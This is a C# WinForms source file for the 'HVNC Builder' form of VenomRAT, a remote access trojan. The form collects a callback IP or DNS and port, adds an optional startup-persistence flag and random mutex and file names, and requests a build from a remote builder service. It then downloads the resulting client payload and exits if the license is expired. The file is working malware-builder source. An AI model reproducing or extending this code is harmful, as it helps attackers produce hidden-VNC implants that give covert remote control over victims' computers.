using System;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using VenomRAT_HVNC.HVNC.Utils;

namespace VenomRAT_HVNC.HVNC
{
    public class FrmBuilder : Form
    {
        public static byte[] b;

        public static Random r = new Random();

        public static Random random = new Random();

        private IContainer components;

        private Panel panel1;

        private Guna2ControlBox guna2ControlBox1;

        private Guna2DragControl guna2DragControl1;

        private Label label18;

        private PictureBox pictureBox1;

        private Guna2NumericUpDown txtPORT;

        private Label label1;

        private Label label24;

        private Label label7;

        private Guna2Button BuildBtn;

        private Guna2CustomCheckBox EnableStartUpBox;

        private Guna2TextBox textBox2;

        private Guna2BorderlessForm guna2BorderlessForm1;

        private Guna2Separator guna2Separator2;

        public Guna2TextBox txtIP;

        public static string pathtosave { get; set; }

        public FrmBuilder()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            try
            {
                if (txtIP.Text == "IP ADDRESS")
                {
                    MessageBox.Show("IP or DNS is required in order to build.", "Venom Rat", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                    return;
                }
                using (FolderBrowserDialog folderBrowserDialog = new FolderBrowserDialog())
                {
                    DialogResult dialogResult = folderBrowserDialog.ShowDialog();
                    if (dialogResult == DialogResult.OK && !string.IsNullOrWhiteSpace(folderBrowserDialog.SelectedPath))
                    {
                        string[] files = Directory.GetFiles(folderBrowserDialog.SelectedPath);
                        pathtosave = folderBrowserDialog.SelectedPath.ToString() + "\\";
                    }
                }
                if (string.IsNullOrWhiteSpace(txtIP.Text) || string.IsNullOrWhiteSpace(txtPORT.Text))
                {
                    MessageBox.Show("All fields are required", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                    return;
                }
                BuildBtn.Text = "Building...";
                BuildBtn.Enabled = false;
                BuildInfo.ip = txtIP.Text;
                BuildInfo.port = txtPORT.Text;
                BuildInfo.id = "VenomHVNC";
                BuildInfo.mutex = RandomMutex(9) + ".exe";
                BuildInfo.startup = "False";
                BuildInfo.hhvnc = "True";
                if (EnableStartUpBox.Checked)
                {
                    BuildInfo.startup = "True";
                }
                else if (!EnableStartUpBox.Checked)
                {
                    BuildInfo.startup = "False";
                }
                BuildInfo.path = "1";
                BuildInfo.folder = textBox2.Text;
                BuildInfo.filename = textBox2.Text;
                BuildInfo.wdex = "False";
                if (HVNC.WebBuilder.WebBuilder.IsBuilderAlive() != "alive")
                {
                    return;
                }
                switch (HVNC.WebBuilder.WebBuilder.SendBuild(BuildInfo.ip, BuildInfo.port, BuildInfo.id, BuildInfo.mutex, BuildInfo.startup, BuildInfo.path, BuildInfo.folder, BuildInfo.filename, BuildInfo.wdex, BuildInfo.hhvnc))
                {
                    case "success":
                        {
                            using (WebClient webClient = new WebClient())
                            {
                                if (File.Exists(Directory.GetCurrentDirectory() + "\\ClientH.exe"))
                                {
                                    File.Delete(Directory.GetCurrentDirectory() + "\\ClientH.exe");
                                }
                                Thread.Sleep(3500);
                                webClient.DownloadFile(HVNC.WebBuilder.WebBuilder.DownloadURL + HVNC.WebBuilder.WebBuilder.Username + "/Client.exe", pathtosave + "ClientH.exe");
                                HVNC.WebBuilder.WebBuilder.DeleteOldBuild();
                                MessageBox.Show("Build Success", "Venom RAT", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                                BuildBtn.Enabled = true;
                                BuildBtn.Text = "Build HVNC";
                            }
                            break;
                        }
                    case "invalid-arguments":
                        MessageBox.Show("Error Connecting to server!", "Venom RAT", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                        BuildBtn.Enabled = true;
                        break;

                    case "missing-args":
                        MessageBox.Show("Error Building Error Code: 4004");
                        BuildBtn.Enabled = true;
                        break;

                    case "invalid-user-or-expired":
                        Environment.Exit(Environment.ExitCode);
                        break;
                }
            }
            catch (Exception ex)
            {
                if (ex.ToString().Contains("403"))
                {
                    MessageBox.Show("Server Blocks Your IP!", "Venom RAT", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
                else
                {
                    MessageBox.Show("Error Building HVNC", "Venom RAT", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                }
            }
        }

        private void FrmBuilder_Load(object sender, EventArgs e)
        {
            textBox2.Text = RandomMutex(8);
            txtIP.Text = GetLocalIPAddress();
        }

        public static string RandomMutex(int length)
        {
            return new string((from s in Enumerable.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz", length)
                               select s[random.Next(s.Length)]).ToArray());
        }

        public static string RandomNumber(int length)
        {
            return new string((from s in Enumerable.Repeat("0123456789", length)
                               select s[random.Next(s.Length)]).ToArray());
        }

        public static string GetLocalIPAddress()
        {
            IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
            IPAddress[] addressList = hostEntry.AddressList;
            foreach (IPAddress iPAddress in addressList)
            {
                if (iPAddress.AddressFamily == AddressFamily.InterNetwork)
                {
                    return iPAddress.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            components = new System.ComponentModel.Container();
            //System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(HVNC.FrmBuilder));
            panel1 = new System.Windows.Forms.Panel();
            guna2Separator2 = new Guna.UI2.WinForms.Guna2Separator();
            pictureBox1 = new System.Windows.Forms.PictureBox();
            label18 = new System.Windows.Forms.Label();
            guna2ControlBox1 = new Guna.UI2.WinForms.Guna2ControlBox();
            guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(components);
            txtIP = new Guna.UI2.WinForms.Guna2TextBox();
            txtPORT = new Guna.UI2.WinForms.Guna2NumericUpDown();
            label1 = new System.Windows.Forms.Label();
            label24 = new System.Windows.Forms.Label();
            label7 = new System.Windows.Forms.Label();
            BuildBtn = new Guna.UI2.WinForms.Guna2Button();
            EnableStartUpBox = new Guna.UI2.WinForms.Guna2CustomCheckBox();
            textBox2 = new Guna.UI2.WinForms.Guna2TextBox();
            guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
            panel1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
            ((System.ComponentModel.ISupportInitialize)txtPORT).BeginInit();
            SuspendLayout();
            panel1.BackColor = System.Drawing.Color.FromArgb(30, 30, 30);
            panel1.Controls.Add(guna2Separator2);
            panel1.Controls.Add(pictureBox1);
            panel1.Controls.Add(label18);
            panel1.Controls.Add(guna2ControlBox1);
            panel1.Dock = System.Windows.Forms.DockStyle.Top;
            panel1.Location = new System.Drawing.Point(0, 0);
            panel1.Name = "panel1";
            panel1.Size = new System.Drawing.Size(662, 53);
            panel1.TabIndex = 13;
            guna2Separator2.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
            guna2Separator2.FillColor = System.Drawing.Color.FromArgb(8, 104, 81);
            guna2Separator2.FillStyle = System.Drawing.Drawing2D.DashStyle.Custom;
            guna2Separator2.FillThickness = 4;
            guna2Separator2.Location = new System.Drawing.Point(0, -3);
            guna2Separator2.Name = "guna2Separator2";
            guna2Separator2.Size = new System.Drawing.Size(662, 10);
            guna2Separator2.TabIndex = 146;
            //pictureBox1.Image = (System.Drawing.Image)resources.GetObject("pictureBox1.Image");
            pictureBox1.Location = new System.Drawing.Point(8, 7);
            pictureBox1.Name = "pictureBox1";
            pictureBox1.Size = new System.Drawing.Size(40, 40);
            pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            pictureBox1.TabIndex = 145;
            pictureBox1.TabStop = false;
            label18.AutoSize = true;
            label18.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            label18.Location = new System.Drawing.Point(57, 16);
            label18.Name = "label18";
            label18.Size = new System.Drawing.Size(64, 24);
            label18.TabIndex = 2;
            label18.Text = "HVNC";
            guna2ControlBox1.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
            guna2ControlBox1.BackColor = System.Drawing.Color.Transparent;
            guna2ControlBox1.FillColor = System.Drawing.Color.Transparent;
            guna2ControlBox1.HoverState.Parent = guna2ControlBox1;
            guna2ControlBox1.IconColor = System.Drawing.Color.White;
            guna2ControlBox1.Location = new System.Drawing.Point(614, 7);
            guna2ControlBox1.Name = "guna2ControlBox1";
            guna2ControlBox1.ShadowDecoration.Parent = guna2ControlBox1;
            guna2ControlBox1.Size = new System.Drawing.Size(45, 39);
            guna2ControlBox1.TabIndex = 0;
            guna2DragControl1.TargetControl = panel1;
            txtIP.BorderColor = System.Drawing.Color.FromArgb(8, 104, 81);
            txtIP.Cursor = System.Windows.Forms.Cursors.IBeam;
            txtIP.DefaultText = "";
            txtIP.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
            txtIP.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
            txtIP.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
            txtIP.DisabledState.Parent = txtIP;
            txtIP.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
            txtIP.FillColor = System.Drawing.Color.FromArgb(24, 24, 24);
            txtIP.FocusedState.BorderColor = System.Drawing.Color.FromArgb(4, 143, 110);
            txtIP.FocusedState.Parent = txtIP;
            txtIP.Font = new System.Drawing.Font("Segoe UI", 9f);
            txtIP.HoverState.BorderColor = System.Drawing.Color.FromArgb(4, 143, 110);
            txtIP.HoverState.Parent = txtIP;
            txtIP.Location = new System.Drawing.Point(161, 136);
            txtIP.Name = "txtIP";
            txtIP.PasswordChar = '\0';
            txtIP.PlaceholderText = "";
            txtIP.SelectedText = "";
            txtIP.ShadowDecoration.Parent = txtIP;
            txtIP.Size = new System.Drawing.Size(249, 26);
            txtIP.TabIndex = 156;
            txtPORT.BackColor = System.Drawing.Color.Transparent;
            txtPORT.BorderColor = System.Drawing.Color.FromArgb(8, 104, 81);
            txtPORT.Cursor = System.Windows.Forms.Cursors.IBeam;
            txtPORT.DisabledState.Parent = txtPORT;
            txtPORT.FillColor = System.Drawing.Color.FromArgb(24, 24, 24);
            txtPORT.FocusedState.BorderColor = System.Drawing.Color.FromArgb(4, 143, 110);
            txtPORT.FocusedState.Parent = txtPORT;
            txtPORT.Font = new System.Drawing.Font("Segoe UI", 9f);
            txtPORT.ForeColor = System.Drawing.Color.FromArgb(125, 137, 149);
            txtPORT.Location = new System.Drawing.Point(416, 135);
            txtPORT.Maximum = new decimal(new int[4] { 65535, 0, 0, 0 });
            txtPORT.Minimum = new decimal(new int[4] { 1024, 0, 0, 0 });
            txtPORT.Name = "txtPORT";
            txtPORT.ShadowDecoration.Parent = txtPORT;
            txtPORT.Size = new System.Drawing.Size(79, 27);
            txtPORT.TabIndex = 155;
            txtPORT.UpDownButtonFillColor = System.Drawing.Color.FromArgb(8, 104, 81);
            txtPORT.UpDownButtonForeColor = System.Drawing.Color.White;
            txtPORT.Value = new decimal(new int[4] { 4448, 0, 0, 0 });
            label1.AutoSize = true;
            label1.BackColor = System.Drawing.Color.Transparent;
            label1.Location = new System.Drawing.Point(158, 120);
            label1.Name = "label1";
            label1.Size = new System.Drawing.Size(48, 13);
            label1.TabIndex = 151;
            label1.Text = "IP/DNS ";
            label24.AutoSize = true;
            label24.BackColor = System.Drawing.Color.Transparent;
            label24.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
            label24.ForeColor = System.Drawing.Color.Gainsboro;
            label24.Location = new System.Drawing.Point(158, 209);
            label24.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            label24.Name = "label24";
            label24.Size = new System.Drawing.Size(50, 16);
            label24.TabIndex = 149;
            label24.Text = "Startup";
            label7.AutoSize = true;
            label7.BackColor = System.Drawing.Color.Transparent;
            label7.Location = new System.Drawing.Point(437, 211);
            label7.Name = "label7";
            label7.Size = new System.Drawing.Size(58, 13);
            label7.TabIndex = 139;
            label7.Text = "File name :";
            BuildBtn.Animated = true;
            BuildBtn.BorderColor = System.Drawing.Color.Maroon;
            BuildBtn.BorderRadius = 1;
            BuildBtn.CheckedState.Parent = BuildBtn;
            BuildBtn.CustomImages.Parent = BuildBtn;
            BuildBtn.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            BuildBtn.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            BuildBtn.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
            BuildBtn.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
            BuildBtn.DisabledState.Parent = BuildBtn;
            BuildBtn.FillColor = System.Drawing.Color.FromArgb(8, 104, 81);
            BuildBtn.Font = new System.Drawing.Font("Segoe UI", 9f);
            BuildBtn.ForeColor = System.Drawing.Color.White;
            BuildBtn.HoverState.Parent = BuildBtn;
            BuildBtn.Location = new System.Drawing.Point(47, 293);
            BuildBtn.Name = "BuildBtn";
            BuildBtn.ShadowDecoration.Parent = BuildBtn;
            BuildBtn.Size = new System.Drawing.Size(576, 30);
            BuildBtn.TabIndex = 158;
            BuildBtn.Text = "Build HVNC";
            BuildBtn.Click += new System.EventHandler(button1_Click);
            EnableStartUpBox.BackColor = System.Drawing.Color.Transparent;
            EnableStartUpBox.CheckedState.BorderRadius = 2;
            EnableStartUpBox.CheckedState.BorderThickness = 0;
            EnableStartUpBox.CheckedState.FillColor = System.Drawing.Color.FromArgb(8, 104, 81);
            EnableStartUpBox.CheckedState.Parent = EnableStartUpBox;
            EnableStartUpBox.CheckMarkColor = System.Drawing.SystemColors.Window;
            EnableStartUpBox.Location = new System.Drawing.Point(161, 182);
            EnableStartUpBox.Name = "EnableStartUpBox";
            EnableStartUpBox.ShadowDecoration.Parent = EnableStartUpBox;
            EnableStartUpBox.Size = new System.Drawing.Size(24, 24);
            EnableStartUpBox.TabIndex = 159;
            EnableStartUpBox.Text = "guna2CustomCheckBox1";
            EnableStartUpBox.UncheckedState.BorderColor = System.Drawing.Color.Transparent;
            EnableStartUpBox.UncheckedState.BorderRadius = 2;
            EnableStartUpBox.UncheckedState.BorderThickness = 0;
            EnableStartUpBox.UncheckedState.FillColor = System.Drawing.Color.Transparent;
            EnableStartUpBox.UncheckedState.Parent = EnableStartUpBox;
            textBox2.BorderColor = System.Drawing.Color.FromArgb(8, 104, 81);
            textBox2.Cursor = System.Windows.Forms.Cursors.IBeam;
            textBox2.DefaultText = "";
            textBox2.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
            textBox2.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
            textBox2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
            textBox2.DisabledState.Parent = textBox2;
            textBox2.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
            textBox2.FillColor = System.Drawing.Color.FromArgb(24, 24, 24);
            textBox2.FocusedState.BorderColor = System.Drawing.Color.FromArgb(4, 143, 110);
            textBox2.FocusedState.Parent = textBox2;
            textBox2.Font = new System.Drawing.Font("Segoe UI", 9f);
            textBox2.HoverState.BorderColor = System.Drawing.Color.FromArgb(4, 143, 110);
            textBox2.HoverState.Parent = textBox2;
            textBox2.Location = new System.Drawing.Point(161, 231);
            textBox2.Name = "textBox2";
            textBox2.PasswordChar = '\0';
            textBox2.PlaceholderText = "";
            textBox2.SelectedText = "";
            textBox2.ShadowDecoration.Parent = textBox2;
            textBox2.Size = new System.Drawing.Size(334, 24);
            textBox2.TabIndex = 156;
            guna2BorderlessForm1.AnimateWindow = true;
            guna2BorderlessForm1.ContainerControl = this;
            guna2BorderlessForm1.DockIndicatorColor = System.Drawing.Color.FromArgb(8, 104, 81);
            guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(8, 104, 81);
            base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
            base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            BackColor = System.Drawing.Color.FromArgb(24, 24, 24);
            base.ClientSize = new System.Drawing.Size(662, 345);
            base.Controls.Add(EnableStartUpBox);
            base.Controls.Add(BuildBtn);
            base.Controls.Add(textBox2);
            base.Controls.Add(txtIP);
            base.Controls.Add(txtPORT);
            base.Controls.Add(label1);
            base.Controls.Add(label7);
            base.Controls.Add(label24);
            base.Controls.Add(panel1);
            ForeColor = System.Drawing.Color.GhostWhite;
            base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            //base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
            base.Name = "FrmBuilder";
            base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            Text = "HVNC Builder";
            base.Load += new System.EventHandler(FrmBuilder_Load);
            panel1.ResumeLayout(false);
            panel1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
            ((System.ComponentModel.ISupportInitialize)txtPORT).EndInit();
            ResumeLayout(false);
            PerformLayout();
        }
    }
}